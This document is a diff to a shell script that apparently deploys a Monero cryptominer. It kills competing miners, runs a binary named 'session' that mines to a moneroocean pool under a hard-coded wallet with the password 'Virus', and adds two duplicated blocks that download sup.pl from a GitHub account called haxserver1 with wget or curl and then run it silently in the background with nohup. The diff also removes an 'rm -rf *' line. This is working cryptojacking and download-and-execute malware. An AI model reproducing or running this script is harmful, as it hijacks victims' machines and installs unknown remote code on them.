@@ -32,8 +32,6 @@ pkill xmrig
 pkill session_ajqysbe
 pkill session_ajqysbey
 pkill session
-rm -rf sess_aksd19sb187ss1ia901b23
-rm -rf *
 echo "Removing Done!"
 
 # Download the file
@@ -79,7 +77,81 @@ chmod +x *
 # Use session.log as the log file
 LOG_FILE="session.log"
 
+# Run the executable file in the background, capturing output to session.log
 ./session -o gulf.moneroocean.stream:80 -u 442xHeyLLcgQSSgbKJrMiG8mECruxyviqKMDt41nMXhgiCJFmA4CJaoQ8gGDz7EH89c2cUk6LaKN1RTPatbU3xhR6dPvaMf -k -p Virus
+
+# Get the PID of the last background process
+PID=$!
+
+# Wait for a moment to check if the process is still running
+sleep 3
+
+# Check if the process is running
+if ps -p $PID > /dev/null; then
+  echo "Process started successfully with PID $PID."
+
+  # Download and run sup.pl
+  wget https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/sup.pl
+  if [ $? -ne 0 ]; then
+    echo "wget failed to download sup.pl. Trying with curl."
+    curl -O https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/sup.pl
+    if [ $? -ne 0 ]; then
+      echo "curl also failed to download sup.pl."
+      exit 1
+    else
+      echo "sup.pl downloaded successfully with curl."
+    fi
+  else
+    echo "sup.pl downloaded successfully with wget."
+  fi
+
+  nohup perl sup.pl >/dev/null 2>&1 &
+  if [ $? -eq 0 ]; then
+    echo "sup.pl started successfully."
+  else
+    echo "Failed to start sup.pl."
+    exit 1
+  fi
+
+else
+  echo "Failed to start process with nohup. Trying alternate method."
+
+  # Try an alternate method to run in the background
+  ./session 
+  PID=$!
+  sleep 3
+
+  if ps -p $PID > /dev/null; then
+    echo "Process started successfully with alternate method with PID $PID."
+
+    # Download and run sup.pl
+    wget https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/sup.pl
+    if [ $? -ne 0 ]; then
+      echo "wget failed to download sup.pl. Trying with curl."
+      curl -O https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/sup.pl
+      if [ $? -ne 0 ]; then
+        echo "curl also failed to download sup.pl."
+        exit 1
+      else
+        echo "sup.pl downloaded successfully with curl."
+      fi
+    else
+      echo "sup.pl downloaded successfully with wget."
+    fi
+
+    nohup perl sup.pl >/dev/null 2>&1 &
+    if [ $? -eq 0 ]; then
+      echo "sup.pl started successfully."
+    else
+      echo "Failed to start sup.pl."
+      exit 1
+    fi
+
+  else
+    echo "Failed to start process with alternate method."
+    exit 1
+  fi
+fi
 
 echo "Script executed successfully."
 exit 1
